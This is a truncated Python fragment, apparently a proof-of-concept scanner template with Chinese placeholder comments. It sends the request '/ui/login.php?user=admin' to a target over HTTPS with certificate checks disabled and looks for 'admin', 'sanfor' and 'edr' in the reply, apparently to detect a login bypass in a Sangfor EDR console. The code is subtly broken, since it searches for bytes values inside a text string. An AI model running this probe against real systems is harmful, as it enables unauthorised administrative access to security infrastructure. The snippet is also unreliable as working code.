...
def check(ip,port):
    ...
    payload = "/ui/login.php?user=admin"                                                      #填写payload
    try:
        tar = "https://" + ip + ":" + port
        ssl = requests.session()
        req = ssl.get(tar + payload,timeout=3,verify=False,allow_redirects=True)
        if req.status_code == 200:                                                          #修改匹配返回代码
            if ( b"admin" in req.text ) and (b"sanfor" in req.text) and (b'edr' in req.text):          #填写匹配信息
